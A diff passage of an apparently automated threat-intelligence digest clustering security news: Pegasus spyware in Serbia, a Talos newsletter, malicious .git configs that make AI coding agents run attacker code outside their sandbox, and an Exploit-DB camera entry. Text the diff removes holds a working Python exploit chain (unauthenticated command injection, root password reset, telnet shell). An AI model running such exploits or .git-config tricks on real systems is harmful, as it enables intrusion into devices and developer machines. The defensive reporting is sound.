agentic threats Farmer said that security organizations used to ask a key question: “Do those [threat actors] with the capability have the motive, and do those with the motive have the capability?” We’re now in a world where non-capable threat actors can use AI to capably launch highly sophisticated attacks. Threats are also becoming more structural. The panel highlighted "indirect prompt injection"—where agents are manipulated by the very instructions they read—as a new, distinct threat vector. As companies deploy a digital workforce of AI agents,
-```
-
-#### Corroborating sources (1)
-
-- **Recorded Future** (threat_research_primary)
-  - Title: The Agentic SOC – From AI Theater to Real Defense
-  - Published: 2026-09-01T00:00:00+00:00
-  - Link: https://www.recordedfuture.com/blog/agentic-soc-real-defense
-  - Summary: Experts from Recorded Future and Accenture offer perspectives on navigating the path to becoming an agentic SOC. Find out how to plan moving beyond “AI theater” by prioritizing measurable KPIs, proactively mitigating autonomous security risks, and evolving the analyst’s role from managing alerts to managing agents.
 
 ### Cluster 396a583814 — score 10
 
@@ -3190,26 +3001,63 @@ CTEM Is Not About the Stages. It’s About the Outcome. Stephen Gates September 
   - Link: https://horizon3.ai/intelligence/blogs/ctem-outcome-not-stages/
   - Summary: CTEM is not about filling five technology boxes. It is about continuously reducing exploitable exposure, proving remediation worked, and measuring whether the environment is becoming harder to attack.
 
-### Cluster bb1555be83 — score 10
+### Cluster 2e68cba663 — score 10
 
-- Title: [hardware] Fullhan FH8626V100 - Multiple Vulnerabilities
-- Source: Exploit-DB (offensive_vulnerability_research)
-- Published: 2026-09-02T00:00:00+00:00
-- Link: https://www.exploit-db.com/exploits/52674
+- Title: The story behind the intelligence
+- Source: Cisco Talos (threat_research_primary)
+- Published: 2026-09-03T18:00:13+00:00
+- Link: https://blog.talosintelligence.com/the-story-behind-the-intelligence/
 - Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- cve_ids: CVE-2026-51402, CVE-2026-51403, CVE-2026-51404, CVE-2026-51405, CVE-2026-51406
-- urgency_signals: poc_available, preauth_unauth
+- threat_categories: ransomware_extortion
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+From engaging with cybercriminals to surviving a live Flamin’ Hot Cheetos taste test, Hazel reflects on the latest Beers with Talos with Azim, where they cover the full spectrum of what it takes to gather threat intel.
+```
+
+#### Full body
+
+```
+The story behind the intelligence By Hazel Burton Thursday, September 3, 2026 14:00 Threat Source newsletter Welcome to this week’s edition of the Threat Source newsletter. Our goal is to get accurate threat intelligence to our audience as quickly as possible, with all the context you need to ask the right questions of your own environment: How at risk are we from this threat? Are we prepared for it? And what can we do about it? What you don’t often see is all the... well, frankly, “mess” involved in producing it. All the dead ends we followed until we could confirm those ends were as dead as a doornail. All the work it took to ultimately produce an assessment, supported by evidence and written so that defenders can act on it. Much of that abstraction is necessary. Defenders need intelligence they can use, not a complete account of every conversation we had, or investigative detour behind it. But it can create an overly tidy picture of both cybercrime and the work required to understand it. If you do fancy a look behind the curtain, though, may I recommend our just-published episode of Beers with Talos ? Our guest is Azim Khodjibaev, whose remit is adversary engagement. His work involves developing personas for deep- and dark-web research, engaging directly with threat actors, and building relationships with people who may become (and have been) openly threatening to him. At one point, he was maintaining eight separate personas, some of which were interacting with one another. Azim’s engagements have helped Talos identify prolific cybercriminals and contributed to wider disruption efforts. They have also resulted in ransomware operators placing “Azim sucks” in their code and accusing him of belonging to the very criminal groups he was investigating. His experiences also expose the problem with treating adversaries as uniformly sophisticated operators. Some are technically capable and highly organised. Others are impulsive, ego-driven, or one-trick ponies. Many have a scary detachment from the consequences of their actions. Increasingly, Azim is seeing less-experienced threat actors working through loosely organised online collectives. Intelligence necessarily turns that disorder into something defenders can understand and use. But occasionally, it is worth looking behind the finished product – the patience it takes to get accurate answers, who we are investigating, and the deeply human behaviour that shapes both sides. This Beers with Talos episode, “Eight People Walk Into a Dark Web Forum. They’re All Azim,” isn’t exactly going to help many people in our industry sleep better at night. But for anyone wanting to understand more about the threat we’re up against, as a co-host of the pod I’m biased, but I believe it’s an essential listen. And if that doesn’t inspire you to download the episode, perhaps my live review of trying Flamin’ Hot Cheetos for the very first time (with a chaser of Nerds) will. The one big thing Cisco Talos is highlighting a growing operational hurdle for security teams that we call the AI "safety penalty." As frontier AI models advance, their built-in guardrails are increasingly blocking legitimate defensive tasks. This was evident in July 2026 when Hugging Face's primary cloud LLM refused to analyze forensic data during a breach, delaying their response. While defenders are slowed by these frustrating refusals, adversaries are freely leveraging unconstrained models to attack at machine speed. Why do I care? This guardrail asymmetry hands the advantage directly to attackers. When a cloud-hosted AI model refuses a forensic request mid-incident, defenders lose precious time. Security teams are paying for vendor-imposed limitations without gaining a capability edge, especially as open-weight alternatives close the reasoning gap. Ultimately, relying on third-party alignment policies means a sudden update in Silicon Valley could quietly break your defensive workflows overnight. So now what? Security leadership
+```
+
+#### Corroborating sources (1)
+
+- **Cisco Talos** (threat_research_primary)
+  - Title: The story behind the intelligence
+  - Published: 2026-09-03T18:00:13+00:00
+  - Link: https://blog.talosintelligence.com/the-story-behind-the-intelligence/
+  - Summary: From engaging with cybercriminals to surviving a live Flamin’ Hot Cheetos taste test, Hazel reflects on the latest Beers with Talos with Azim, where they cover the full spectrum of what it takes to gather threat intel.
+
+### Cluster bb1555be83 — score 10
+
+- Title: [hardware] Fullhan FH8626V100 - Multiple Vulnerabilities
+- Source: Exploit-DB (offensive_vulnerability_research)
+- Published: 2026-09-02T00:00:00+00:00
+- Link: https://www.exploit-db.com/exploits/52674
+- Fetch status: fetch_failed:HTTPError
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research
 
 #### Primary article taxonomy
-- cve_ids: CVE-2026-51402, CVE-2026-51403, CVE-2026-51404, CVE-2026-51405, CVE-2026-51406
-- urgency_signals: preauth_unauth, poc_available
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research
 
@@ -3217,12 +3065,6 @@ CTEM Is Not About the Stages. It’s About the Outcome. Stephen Gates September 
 
 ```
 Fullhan FH8626V100 - Multiple Vulnerabilities
-```
-
-#### Full body
-
-```
-Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training Fullhan FH8626V100 - Multiple Vulnerabilities EDB-ID: 52674 CVE: 2026-51407 2026-51406 2026-51405 2026-51404 2026-51403 2026-51402 EDB Verified: Author: Amir Aliu Type: hardware Exploit: / Platform: Multiple Date: 2026-09-02 Vulnerable App: # Exploit Title: Fullhan FH8626V100 - Multiple Vulnerabilities # Date: 31-03-2026 # Exploit Author: Amir Aliu # Vendor Homepage: https://www.fullhan.com/ # Software Link: N/A - OEM/whitelabel IP camera module, rebranded under numerous vendor/brand names # Version: Firmware v201222.1007 (Device Model AJL30PG0803) # Tested on: FH8626V100 SoC (Fullhan FH86xx family), AJL30PG0803 device, BusyBox v1.19.3, embedded Linux (ARM) # CVE: CVE-2026-51402, CVE-2026-51403, CVE-2026-51404, CVE-2026-51405, CVE-2026-51406, CVE-2026-51407 # Blog: https://amiraliu.vercel.app/blog/breaking-into-my-own-camera # Source: https://github.com/amiraliuks/ip-camera-research # Summary A range of rebranded IP cameras built on the Fullhan FH8626V100 SoC and shipped with the "CareCam Pro" app expose a chain of vulnerabilities that lead to full device compromise. - CVE-2026-51402: TCP/1300 accepts <SYSTEM>...</SYSTEM>-wrapped shell commands with no authentication (blind OS command injection, CWE-78). - CVE-2026-51403: The PSIA HTTP API (/PSIA/*) allows unauthenticated read/write access to device and network configuration (CWE-306/CWE-284). - CVE-2026-51404: An unauthenticated JPEG snapshot is served on TCP/6688 (CWE-200). - CVE-2026-51405: BusyBox telnetd is enabled by default via inetd, exposing a root shell to anyone holding valid credentials (CWE-287). - CVE-2026-51406: /PSIA/Security/AAA/users discloses the admin username and password in plaintext with no authentication (CWE-522). - CVE-2026-51407: Once shell access is obtained, /app/userdata/ifcfg.wlan0 stores the configured Wi-Fi SSID/password in plaintext (CWE-319). # Exploitation Chain The command injection (CVE-2026-51402) is used to reset the root password, which is then used to authenticate to the always-on Telnet service (CVE-2026-51405), yielding a full root shell with no valid credentials required at any point. # Proof of Concept (PoC) [Full Chain] import socket import requests import sys import os TARGET = None NEW_PASSWORD = "root" # Helpers def send_system(cmd, port): """Send <SYSTEM> command to target""" payload = f"<SYSTEM>{cmd}</SYSTEM>" try: with socket.socket() as s: s.settimeout(3) s.connect((TARGET, port)) s.send(payload.encode()) data = s.recv(1024).decode() return data except Exception: return None def check_port(port): """Simple TCP check""" try: with socket.socket() as s: s.settimeout(2) s.connect((TARGET, port)) return True except: return False # Checks def check_rce(port): print(f"[.] Checking RCE on port {port}...") res = send_system("ls", port) if res and "<SYSTEM_ACK>ok</SYSTEM_ACK>" in res: print(f"[+] RCE available on port {port}") return True else: print(f"[-] Port {port} not vulnerable") return False def check_telnet(): print("[.] Checking telnet (port 23)...") if check_port(23): print("[+] Telnet is open") return True else: print("[-] Telnet is closed") return False def get_snapshot(save=False): print("[.] Fetching snapshot...") try: r = requests.get(f"http://{TARGET}:6688/snapshot.jpg", timeout=5) if r.status_code == 200: if save: with open("snapshot.jpg", "wb") as f: f.write(r.content) print("[+] snapshot.jpg saved") return r.content else: print("[-] Failed to get snapshot") return None except Exception: print("[-] Request failed") return None def show_snapshot(): data = get_snapshot(save=False) if not data: return tmp_file = "/tmp/snapshot.jpg" with open(tmp_file, "wb") as f: f.write(data) print("[+] Opening snapshot...") os.system(f"xdg-open {tmp_file}") # Exploit def reset_root_password(): print("[+] Changing root password...") res = send_system(f'echo "root:{NEW_PASSWORD}" | chpasswd', 1300) print(f"[+] Response: {res}") if
 ```
 
 #### Corroborating sources (1)
@@ -3671,16 +3513,24 @@ Will Thomas 5 min read January 21, 2026 Scattered Spider Attacks | Infrastructur
 - Source: The Hacker News (cyber_news_breach_reporting)
 - Published: 2026-09-03T08:43:17+00:00
 - Link: https://thehackernews.com/2026/09/pegasus-zero-click-spyware-exploit.html
-- Fetch status: not_attempted
+- Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
+- threat_categories: active_exploitation, apt_espionage, phishing_social_eng
+- affected_industries: critical_infrastructure, government, manufacturing_industrial
+- affected_products: Anthropic/Claude, GitLab, Gitea
+- urgency_signals: actively_exploited, preauth_unauth
 - content_type: threat_research
 - confidence_tier: tier_4_news
 
 #### Primary article taxonomy
+- threat_categories: phishing_social_eng, apt_espionage, active_exploitation
+- affected_industries: government, critical_infrastructure, manufacturing_industrial
+- affected_products: GitLab, Gitea, Anthropic/Claude
+- urgency_signals: actively_exploited, preauth_unauth
 - content_type: threat_research
 - confidence_tier: tier_4_news
 
@@ -3688,6 +3538,12 @@ Will Thomas 5 min read January 21, 2026 Scattered Spider Attacks | Infrastructur
 
 ```
 The iPhone belonging to a member of Serbia's student protest movement was infected with NSO Group's Pegasus spyware, according to new findings from the Citizen Lab in collaboration with the SHARE Foundation. "Our analysis confirmed that an iMessage zero-click exploit was used to infect the device with NSO Group's Pegasus spyware," the Citizen Lab said. "We found high-confidence indicators of
+```
+
+#### Full body
+
+```
+Pegasus Zero-Click Spyware Exploit Infects Serbian Student Movement Member's iPhone  Ravie Lakshmanan  Sep 03, 2026 Spyware / Mobile Security The iPhone belonging to a member of Serbia's student protest movement was infected with NSO Group's Pegasus spyware , according to new findings from the Citizen Lab in collaboration with the SHARE Foundation. "Our analysis confirmed that an iMessage zero-click exploit was used to infect the device with NSO Group's Pegasus spyware," the Citizen Lab said . "We found high-confidence indicators of infection from a period across December 2025 – January 2026; however, this does not preclude the possibility of additional infections." It's assessed that the zero-click exploit used in the attack targeted Apple iMessage, and has been addressed by Apple with iOS 18.4.1 , which was released in April 2025. The discovery comes in the aftermath of Apple sending a new set of threat notifications to customers whom it suspected may have been targeted by mercenary spyware attacks. The alerts were sent to an unspecified number of users in 110 countries. In all, at least 14 people in Serbia have been targeted with advanced spyware since the beginning of 2026, the SHARE Foundation confirmed . Among those targeted were student movement members, activists, a member of parliament, and a local councilor from opposition parties. The timing of these incidents coincided with the local elections held on March 29, 2026. Another student movement member had their phone compromised with a new version of the NoviSpy Android spyware after their device was confiscated during police questioning. "The forensic findings by SHARE prove that Serbian students continue to be targeted with invasive Android spyware tools, installed while detained by Serbian authorities," Donncha Ó Cearbhaill, head of Amnesty International's Security Lab, said. "The latest 2026 case also reveals a new Android spyware, similar in functionality to NoviSpy, but newly built with specific efforts taken to avoid detection by security experts." SHARE said the same spyware strain has been detected on a second device, after private Viber messages from that phone were disclosed live on Informer TV, a Serbian pro-government news and media television channel. The development is the latest in a string of documented abuses of surveillance technology in the country, including the use of Cellebrite forensic tools to deploy NoviSpy. Users who are at risk because of who they are and what they do should keep the devices up-to-date and consider enabling Lockdown Mode on iOS. Google also offers an Advanced Protection Program to safeguard Android users with high visibility and sensitive information from targeted online attacks. Earlier this year, Meta-owned WhatsApp announced a feature called Strict Account Settings to protect users against advanced cyber attacks by automatically locking certain settings to the most restrictive options, while blocking attachments and media from people not in a user's contact list. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Android , Apple , cyber espionage , Malware , mobile security ⚡ Top Stories This Week Critical Keycloak Password Reset Flaw Could Let Unauthenticated Attackers Take Over Any Account ⚡ Weekly Recap: AI-Powered PLC Attacks, GitLab Attacks, Stripe Key Leaks and More Actively Exploited Oracle WebLogic Flaw Lets Unauthenticated Attackers Access Critical Data WhatsApp Adds Multiple Passkeys for Phishing-Resistant Sign-Ins Across iOS and Android A Malicious Webpage Could Poison Your Local AI Model Behind NVIDIA NemoClaw Critical Gitea RCE Actively Exploited as Reported Attack Drops Miner-Like Payload Claude Opus 4.6 Bypasses Gym Booking Limit, Cancels Other Users' Reservations in Tests CISA Red Team Compromised Two Critical Infrastructure Orgs, One Detected Nothing FBI Disrupts China-Linked QTFY
 ```
 
 #### Corroborating sources (1)
@@ -3704,17 +3560,21 @@ The iPhone belonging to a member of Serbia's student protest movement was infect
 - Source: The Hacker News (cyber_news_breach_reporting)
 - Published: 2026-09-02T14:06:59+00:00
 - Link: https://thehackernews.com/2026/09/malicious-git-configs-can-make-claude.html
-- Fetch status: not_attempted
+- Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
+- affected_products: Anthropic/Claude, GitHub, OpenAI/ChatGPT
+- cve_ids: CVE-2021-43891, CVE-2022-24346, CVE-2026-19592, CVE-2026-72718
 - urgency_signals: no_patch_yet
 - content_type: news_report
 - confidence_tier: tier_4_news
 
 #### Primary article taxonomy
+- affected_products: Anthropic/Claude, GitHub, OpenAI/ChatGPT
+- cve_ids: CVE-2026-19592, CVE-2026-72718, CVE-2021-43891, CVE-2022-24346
 - urgency_signals: no_patch_yet
 - content_type: news_report
 - confidence_tier: tier_4_news
@@ -3723,6 +3583,12 @@ The iPhone belonging to a member of Serbia's student protest movement was infect
 
 ```
 Manifold Security has disclosed eight security flaws across seven command-line AI coding agents in which a repository's own Git configuration names a command that the agent runs on the developer's machine, four of them still unpatched at publication. The command executes as the user, outside the agent's sandbox and without an approval prompt, and exploitation requires the repository to arrive
+```
+
+#### Full body
+
+```
+Malicious .git Configs Can Make Claude, Codex, Cursor, and Other AI Agents Run Attacker Code  Swati Khandelwal  Sep 02, 2026 Vulnerability / AI Coding Agent Manifold Security has disclosed eight security flaws across seven command-line AI coding agents in which a repository's own Git configuration names a command that the agent runs on the developer's machine, four of them still unpatched at publication. The command executes as the user, outside the agent's sandbox and without an approval prompt, and exploitation requires the repository to arrive as files with its .git directory intact, which a shared archive, a shared drive, a sync folder, or a USB stick preserves, whereas an ordinary clone does not. Fixes have shipped for goose, Claude Code, and Cursor, while Hermes Agent, Qwen Code, Grok Build, and a second path in Claude Code were still executing repository-supplied commands when Manifold retested them on September 1. OpenAI published three CVEs of its own the same day covering the identical class in Codex, credited to three unrelated research groups. "The helper runs outside Codex's command sandbox and without a user-approval prompt, allowing attacker-controlled code to run with the user's privileges. The code can read, change, or delete the user's files and access other resources available to the user's account," OpenAI said in the record for CVE-2026-19592 . On Claude Code and Hermes Agent, the payload fires before the workspace-trust prompt is accepted; on Qwen Code, before the user has authenticated; and on Grok Build, on the first keystroke. core.fsmonitor is a Git performance setting whose value is a command that Git runs to identify changed files, and Git reads it from the repository's own .git/config. Any operation that refreshes the index, including git status and git diff, executes that command. The agents call those commands in the background to determine which branch they are on and which files have changed, leaving the repository's configuration untouched. Manifold, which published the findings as GitSpawn , wrote up five of the eight in detail and said it found the pattern in more agents than it names. "The vulnerability is not in the model, or in anything new. It is in the ordinary plumbing underneath, the subprocess an agent spawns at session startup to work out where it is," Manifold said. The following agents and versions are affected - goose - All versions prior to 1.44.0, fixed in 1.44.0 Codex CLI - 0.102.0 through 0.130.0, fixed in 0.131.0 Codex Desktop for macOS - 260202.0859 through 26.513.31313, fixed in 26.519.22136 Codex Desktop for Windows - 26.304.38 through 26.513.40821, fixed in 26.519.21041, and Microsoft Store package 26.304.38.0 through 26.513.4821.0, fixed in 26.519.2081.0 Claude Code - Confirmed by Manifold on 2.1.193 and fixed by 2.1.196 on the core.fsmonitor path, with the claude ultrareview path confirmed live on 2.1.252 Hermes Agent - 0.18.2 and 0.21.0 confirmed by Manifold, fix pending Qwen Code - 0.19.6 and 0.22.3 confirmed by Manifold, fix pending Grok Build - 0.2.93 and 1.0.13 confirmed by Manifold, fix pending In goose, the goose review command builds its Git invocations with one configuration flag, -c core.quotePath=off, and strips nothing else. GitHub assigned CVE-2026-72718 a CVSS 4.0 base score of 7.0 in an advisory crediting Francisco Rosales , the only score any of these findings carries. "So running goose review inside a malicious repo runs attacker code - no submitted prompt, no model call, no tool approval, no trust prompt. The command executes before goose ever contacts the model," the advisory said. Sonar reported the same sink in April , noted that Anthropic had already moved the startup sequence once to close it, and identified the same trust-dialog bypass in Visual Studio Code before 1.63.1 ( CVE-2021-43891 ) and in JetBrains IDEs before 2021.3.1 ( CVE-2022-24346 ). "In version 2.0.34, Claude was updated in a way that mitigated the specific vulnerability by no lo
 ```
 
 #### Corroborating sources (1)
@@ -3771,6 +3637,41 @@ Cybersecurity researchers have identified a set of 13 malicious Composer theme p
   - Published: 2026-09-01T14:07:20+00:00
   - Link: https://thehackernews.com/2026/09/13-malicious-packagist-packages-target.html
   - Summary: Cybersecurity researchers have identified a set of 13 malicious Composer theme packages on Packagist that are designed to inject JavaScript into Vietnamese movie and comic streaming sites that install those libraries and initiate the deployment of spyware aimed at unpatched iOS devices. "The injected code runs two operations against a site's visitors: a mobile ad-fraud and gambling-redirect
+
+### Cluster 4933c82778 — score 10
+
+- Title: From Padding Oracle to Shell: Unauthenticated RCE in Telerik UI for ASP.NET AJAX
+- Source: Reddit r/netsec (reddit_practitioner_osint)
+- Published: 2026-09-07T03:47:14+00:00
+- Link: https://www.reddit.com/r/netsec/comments/1w9h4ng/from_padding_oracle_to_shell_unauthenticated_rce/
+- Fetch status: not_attempted
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- urgency_signals: preauth_unauth
+- content_type: news_report
+- confidence_tier: tier_5_chatter
+
+#### Primary article taxonomy
+- urgency_signals: preauth_unauth
+- content_type: news_report
+- confidence_tier: tier_5_chatter
+
+#### Summary
+
+```
+submitted by /u/_pimps [link] [comments]
+```
+
+#### Corroborating sources (1)
+
+- **Reddit r/netsec** (reddit_practitioner_osint)
+  - Title: From Padding Oracle to Shell: Unauthenticated RCE in Telerik UI for ASP.NET AJAX
+  - Published: 2026-09-07T03:47:14+00:00
+  - Link: https://www.reddit.com/r/netsec/comments/1w9h4ng/from_padding_oracle_to_shell_unauthenticated_rce/
+  - Summary: submitted by /u/_pimps [link] [comments]
 
 ### Cluster a91efa5346 — score 9
 
